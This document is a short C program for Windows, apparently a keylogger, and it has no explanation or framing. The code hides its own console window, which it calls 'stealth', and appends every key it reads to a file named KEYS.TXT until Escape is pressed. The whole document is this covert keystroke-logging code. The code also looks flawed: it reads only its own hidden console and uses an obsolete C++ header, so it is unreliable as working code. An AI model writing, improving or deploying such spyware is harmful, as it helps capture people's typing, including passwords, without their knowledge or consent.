
#include<stdio.h>
#include<conio.h>
#include<windows.h>
#include<winuser.h>
#include<iostream.h>

int main ( void )
{
  int cha;
  char ch;
  FILE *fptr;
  HWND stealth; /*creating stealth (window is not visible)*/
  AllocConsole();
  stealth=FindWindowA("ConsoleWindowClass",NULL);
  ShowWindow(stealth,0);
  while(1)  {
    if ( kbhit() ) {
      ch = getch();
      cha = ch;
      fptr = fopen("KEYS.TXT", "a+");
      fputc(ch,fptr);
      fclose(fptr);
      if ( cha == 27 )
        {
          return 0; 
        }
      }
    }
}
